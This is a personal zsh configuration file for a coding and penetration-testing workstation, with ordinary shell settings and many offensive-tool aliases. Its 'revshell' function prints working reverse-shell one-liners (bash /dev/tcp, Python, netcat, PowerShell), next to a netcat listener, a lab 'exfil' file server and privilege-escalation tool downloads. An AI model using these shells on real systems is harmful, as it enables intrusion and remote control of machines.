# =============================================================================
# Zsh Config -- Coding & Cybersecurity Workstation
# ~/.zshrc
# =============================================================================

# ── Pywal -- restore terminal colors ─────────────────────────────────────
(cat ~/.cache/wal/sequences 2>/dev/null &)
source ~/.cache/wal/colors.sh 2>/dev/null || true

# ── Zinit plugin manager ──────────────────────────────────────────────────
ZINIT_HOME="${XDG_DATA_HOME:-${HOME}/.local/share}/zinit/zinit.git"
if [[ ! -d "$ZINIT_HOME" ]]; then
  mkdir -p "$(dirname "$ZINIT_HOME")"
  git clone https://github.com/zdharma-continuum/zinit.git "$ZINIT_HOME"
fi
source "${ZINIT_HOME}/zinit.zsh"

# ── Plugins ────────────────────────────────────────────────────────────────
zinit light zsh-users/zsh-autosuggestions
zinit light zsh-users/zsh-syntax-highlighting
zinit light zsh-users/zsh-completions
zinit light Aloxaf/fzf-tab
zinit light agkozak/zsh-z                      # smart directory jumping

# ── Completion system ──────────────────────────────────────────────────────
autoload -Uz compinit && compinit -C
zinit cdreplay -q

zstyle ':completion:*'                matcher-list 'm:{a-z}={A-Za-z}'
zstyle ':completion:*'                list-colors  "${(s.:.)LS_COLORS}"
zstyle ':completion:*'                menu         no
zstyle ':fzf-tab:complete:cd:*'       fzf-preview "eza -1 --color=always $realpath"
zstyle ':fzf-tab:complete:__zoxide_z:*' fzf-preview "eza -1 --color=always $realpath"

# ── History ────────────────────────────────────────────────────────────────
HISTFILE=~/.zsh_history
HISTSIZE=50000
SAVEHIST=50000
setopt appendhistory sharehistory
setopt hist_ignore_space hist_ignore_all_dups hist_save_no_dups
setopt hist_find_no_dups hist_reduce_blanks

# ── Options ────────────────────────────────────────────────────────────────
setopt autocd interactive_comments
setopt correct                                   # suggest corrections
unsetopt beep

# ── Vi mode ────────────────────────────────────────────────────────────────
bindkey -v
export KEYTIMEOUT=1
bindkey '^p' history-search-backward
bindkey '^n' history-search-forward
bindkey '^a' beginning-of-line
bindkey '^e' end-of-line
bindkey '^w' backward-kill-word
bindkey '^r' history-incremental-search-backward

# ── PATH ───────────────────────────────────────────────────────────────────
typeset -U path
path=(
  $HOME/.opencode/bin
  $HOME/.local/bin
  $HOME/.cargo/bin
  $HOME/.lmstudio/bin
  $HOME/go/bin
  /opt/metasploit-framework/bin
  /opt/ghidra
  $path
)

# ── Environment ────────────────────────────────────────────────────────────
export EDITOR="nvim"
export VISUAL="nvim"
export PAGER="less"
export LESS="-RFX"
export MANPAGER="nvim +Man!"

export XDG_CONFIG_HOME="$HOME/.config"
export XDG_DATA_HOME="$HOME/.local/share"
export XDG_CACHE_HOME="$HOME/.cache"
export XDG_STATE_HOME="$HOME/.local/state"

# Wayland
export QT_QPA_PLATFORM=wayland
export MOZ_ENABLE_WAYLAND=1
export GDK_BACKEND=wayland
export XDG_SESSION_TYPE=wayland
export XDG_CURRENT_DESKTOP=niri

# ── FZF ────────────────────────────────────────────────────────────────────
export FZF_DEFAULT_COMMAND='fd --type f --hidden --follow --exclude .git'
export FZF_DEFAULT_OPTS="
  --height=50% --layout=reverse --border=rounded
  --color=bg+:#24283b,bg:#1a1b26,fg:#c0caf5,fg+:#c0caf5
  --color=hl:#7aa2f7,hl+:#7dcfff,info:#9ece6a,marker:#f7768e
  --color=prompt:#7aa2f7,spinner:#bb9af7,pointer:#bb9af7,header:#7aa2f7
  --color=border:#3b4261,label:#c0caf5,query:#c0caf5
  --prompt='  ' --pointer='' --marker='+'
"
export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
export FZF_ALT_C_COMMAND='fd --type d --hidden --follow --exclude .git'

# Source fzf keybinds
[[ -f /usr/share/fzf/key-bindings.zsh ]] && source /usr/share/fzf/key-bindings.zsh
[[ -f /usr/share/fzf/completion.zsh ]]    && source /usr/share/fzf/completion.zsh

# ── Aliases: General ───────────────────────────────────────────────────────
alias v="nvim"
alias vi="nvim"
alias vim="nvim"
alias c="clear"
alias q="exit"
alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."

# ls -> eza
if command -v eza &>/dev/null; then
  alias ls="eza --icons --group-directories-first"
  alias ll="eza -la --icons --group-directories-first --git"
  alias lt="eza -la --icons --tree --level=2"
  alias la="eza -a --icons --group-directories-first"
else
  alias ls="ls --color=auto"
  alias ll="ls -la"
  alias la="ls -a"
fi

alias cat="bat --paging=never"
alias grep="grep --color=auto"
alias df="df -h"
alias du="du -h"
alias free="free -h"

# ── Aliases: Tmux ──────────────────────────────────────────────────────────
alias t="tmux"
alias ta="tmux attach -t"
alias tl="tmux list-sessions"
alias tn="tmux new-session -s"
alias tk="tmux kill-session -t"
alias td="tmux detach"

# ── Aliases: Git ───────────────────────────────────────────────────────────
alias g="git"
alias gs="git status -sb"
alias ga="git add"
alias gc="git commit"
alias gp="git push"
alias gl="git log --oneline --graph --decorate -20"
alias gd="git diff"
alias gco="git checkout"
alias gb="git branch"
alias gpl="git pull --rebase"
alias gst="git stash"

# ── Aliases: System ────────────────────────────────────────────────────────
alias pac="sudo pacman"
alias pacs="pacman -Ss"
alias paci="sudo pacman -S"
alias pacr="sudo pacman -Rns"
alias pacu="sudo pacman -Syu"
alias yays="yay -Ss"
alias yayi="yay -S"
alias yayu="yay -Syu"

alias sys="systemctl"
alias sysu="systemctl --user"
alias jctl="journalctl -xeu"

# ── Aliases: LM Studio ────────────────────────────────────────────────────
# `lms` comes from ~/.lmstudio/bin (added to PATH at the bottom of this file)
# and is the real CLI -- do not alias it.  `lm-studio` is the GUI binary.
alias lmsgui="lm-studio"
alias lms-server="lms server start --port 1234"
alias lms-stop="lms server stop"
alias lms-status="curl -s http://localhost:1234/v1/models | jq '.data[].id' 2>/dev/null || echo 'LM Studio server not running'"
alias lms-chat="curl -s http://localhost:1234/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{\"model\":\"local-model\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello\"}]}' | jq '.choices[0].message.content'"

# ── Aliases: Coding ────────────────────────────────────────────────────────
alias py="python3"
alias pip="pip3"
alias venv="python3 -m venv .venv"
alias activate="source .venv/bin/activate"
alias cargo-w="cargo watch -x run"
alias mk="make -j$(nproc)"
alias lg="lazygit"
alias dc="docker compose"
alias dcu="docker compose up -d"
alias dcd="docker compose down"
alias dcl="docker compose logs -f"
alias dps="docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}'"

# ── Aliases: Networking & Cybersecurity ────────────────────────────────────
alias myip="curl -s ifconfig.me && echo"
alias localip="ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -5"
alias ports="ss -tulnp"
alias listening="ss -tlnp"
alias connections="ss -tnp"
alias pingg="ping -c 5"

# Nmap shortcuts
alias nmap-quick="nmap -sV -sC -T4"
alias nmap-full="nmap -sV -sC -A -T4 -p-"
alias nmap-udp="sudo nmap -sU -sV -T4"
alias nmap-vuln="nmap --script vuln"
alias nmap-stealth="sudo nmap -sS -T2 -f --data-length 24"
alias nmap-os="sudo nmap -O -sV"

# Enumeration
alias enum-smb="enum4linux -a"
alias enum-dns="dnsenum"
alias nikto-scan="nikto -h"
alias dirb-scan="dirb"
alias gobuster-dir="gobuster dir -w /usr/share/wordlists/dirb/common.txt -u"
alias ffuf-dir="ffuf -w /usr/share/wordlists/dirb/common.txt -u"
alias ferox="feroxbuster -w /usr/share/wordlists/dirb/common.txt -u"

# Exploitation
alias msf="msfconsole -q"
alias msfv="msfvenom"
alias sqlmap-get="sqlmap --batch --random-agent -u"
alias hydra-ssh="hydra -V -f -t 4 ssh://"
alias john-crack="john --wordlist=/usr/share/wordlists/rockyou.txt"
alias hashcat-md5="hashcat -m 0 -a 0"

# Wireless
alias airmon="sudo airmon-ng"
alias airodump="sudo airodump-ng"
alias aireplay="sudo aireplay-ng"

# Forensics / reversing
alias strings="strings -a"
alias hexdump="xxd"
alias objdump-x="objdump -d -M intel"
alias strace-f="strace -f -e trace=network,write"
alias ltrace-f="ltrace -f -e '*'"

# Traffic analysis
alias tcpdump-http="sudo tcpdump -i any -A -s 0 'tcp port 80 or tcp port 443'"
alias tcpdump-dns="sudo tcpdump -i any -n 'port 53'"
alias shark="wireshark"
alias tshark-http="tshark -i any -f 'tcp port 80' -Y http"

# Web
alias curl-headers="curl -sI"
alias curl-follow="curl -sL"
alias whatweb-scan="whatweb -a 3"

# Crypto / encoding
alias b64e="base64"
alias b64d="base64 -d"
alias sha256="sha256sum"

# Container security
alias trivy-image="trivy image"
alias trivy-fs="trivy fs ."
alias docker-bench="docker run --rm -it docker/docker-bench-security"

# ── Aliases: BlackArch Tools ───────────────────────────────────────────────
# OSINT / recon
alias harvest="theHarvester -d"
alias spiderfoot-web="spiderfoot -l 127.0.0.1:5001"
alias sublist3r-enum="sublist3r -d"

# Web exploitation
alias wpscan-enum="wpscan --enumerate ap,at,u --url"
alias commix-test="commix --url"
alias dalfox-scan="dalfox url"
alias jwt-crack="jwt_tool"

# Exploitation
alias evilwinrm="evil-winrm -i"
alias routersploit="rsf"

# Wireless
alias wifite-auto="sudo wifite --kill"
alias bettercap-sniff="sudo bettercap -iface"

# Privesc / post
# linpeas/winpeas/pspy are installed via PKG_BLACKARCH; call them directly.
alias winpeas-get="curl -sLO https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe"
alias pspy32="curl -sLO https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32"
alias pspy64="curl -sLO https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"

# Wordlists
alias seclist="ls /usr/share/seclists/"
alias rockyou="cat /usr/share/wordlists/rockyou.txt"
alias wordlists="find /usr/share/wordlists /usr/share/seclists -name '*.txt' 2>/dev/null | head -30"

# ── Functions: Cybersecurity ───────────────────────────────────────────────

# Quickly serve a file over HTTP (for exfil/transfer in labs)
serve() {
  local port="${1:-8000}"
  echo "[*] Serving $(pwd) on http://0.0.0.0:$port"
  python3 -m http.server "$port"
}

# Reverse shell listener
listen() {
  local port="${1:-4444}"
  echo "[*] Listening on port $port ..."
  nc -lvnp "$port"
}

# Generate reverse shell one-liners
revshell() {
  local ip="${1:?Usage: revshell <IP> <PORT>}"
  local port="${2:?Usage: revshell <IP> <PORT>}"
  echo "--- Bash ---"
  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo ""
  echo "--- Python ---"
  echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  echo ""
  echo "--- Netcat ---"
  echo "nc -e /bin/sh $ip $port"
  echo ""
  echo "--- PowerShell ---"
  echo "\$c=New-Object Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length)}"
}

# Spawn a PTY upgrade (paste into a dumb shell)
pty-upgrade() {
  echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
  echo "  then: Ctrl-Z"
  echo "  stty raw -echo; fg"
  echo "  export TERM=xterm-256color"
}

# Quick hash identification
hashid() {
  local hash="${1:?Usage: hashid <hash>}"
  local len=${#hash}
  case $len in
    32)  echo "Likely: MD5 / NTLM" ;;
    40)  echo "Likely: SHA-1" ;;
    56)  echo "Likely: SHA-224" ;;
    64)  echo "Likely: SHA-256" ;;
    96)  echo "Likely: SHA-384" ;;
    128) echo "Likely: SHA-512" ;;
    *)   echo "Unknown hash length: $len chars" ;;
  esac
}

# Extract any archive
extract() {
  if [[ -f "$1" ]]; then
    case "$1" in
      *.tar.bz2) tar xjf "$1"   ;;
      *.tar.gz)  tar xzf "$1"   ;;
      *.tar.xz)  tar xJf "$1"   ;;
      *.bz2)     bunzip2 "$1"   ;;
      *.rar)     unrar x "$1"   ;;
      *.gz)      gunzip "$1"    ;;
      *.tar)     tar xf "$1"    ;;
      *.tbz2)    tar xjf "$1"   ;;
      *.tgz)     tar xzf "$1"   ;;
      *.zip)     unzip "$1"     ;;
      *.Z)       uncompress "$1" ;;
      *.7z)      7z x "$1"     ;;
      *)         echo "Cannot extract '$1'" ;;
    esac
  else
    echo "'$1' is not a valid file"
  fi
}

# Scan a subnet quickly
quickscan() {
  local target="${1:?Usage: quickscan <target/CIDR>}"
  echo "[*] Quick TCP scan on $target"
  nmap -sn "$target" | grep "Nmap scan report" | awk '{print $NF}'
}

# Whois + DNS summary
recon() {
  local domain="${1:?Usage: recon <domain>}"
  echo "=== WHOIS ==="
  whois "$domain" | grep -iE "registrant|admin|name server|creation|expir" | head -15
  echo ""
  echo "=== DNS A Records ==="
  dig +short "$domain" A
  echo ""
  echo "=== DNS MX Records ==="
  dig +short "$domain" MX
  echo ""
  echo "=== DNS TXT Records ==="
  dig +short "$domain" TXT
}

# ── Prompt (Starship) ─────────────────────────────────────────────────────
if command -v starship &>/dev/null; then
  eval "$(starship init zsh)"
fi

# ── Zoxide (smart cd) ─────────────────────────────────────────────────────
if command -v zoxide &>/dev/null; then
  eval "$(zoxide init zsh)"
fi

# ── direnv (per-project envs) ─────────────────────────────────────────────
if command -v direnv &>/dev/null; then
  eval "$(direnv hook zsh)"
fi

# ── Local overrides (~/.zshrc.local) ──────────────────────────────────────
# Per-machine settings live here: hardware-specific env vars (ROCm/CUDA,
# HSA_OVERRIDE_GFX_VERSION), private aliases, work secrets, etc. Mirrors
# the ~/.gitconfig.local pattern. Sourced last so it can override anything
# above. Untracked -- create it manually on each machine.
[[ -r "$HOME/.zshrc.local" ]] && source "$HOME/.zshrc.local"

# ── Greeting ───────────────────────────────────────────────────────────────
if command -v fastfetch &>/dev/null; then
  fastfetch
elif command -v neofetch &>/dev/null; then
  neofetch
else
  printf '\e[34m'
  cat << 'BANNER'
      ___           ___           ___           ___
     /\  \         /\  \         /\  \         /\__\
    /::\  \       /::\  \       /::\  \       /:/  /
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/
  /::\~\:\  \   /::\~\:\  \   /:/  \:\  \   /::\  \
 /:/\:\ \:\__\ /:/\:\ \:\__\ /:/__/ \:\__\ /:/\:\  \
 \/__\:\/:/  / \/_|::\/:/  / \:\  \  \/__/ \/__\:\  \
      \::/  /     |:|::/  /   \:\  \            \:\  \
      /:/  /      |:|\/__/     \:\  \            \:\  \
     /:/  /       |:|  |        \:\__\            \:\__\
     \/__/         \|__|         \/__/             \/__/
BANNER
  printf '\e[0m\n'
fi


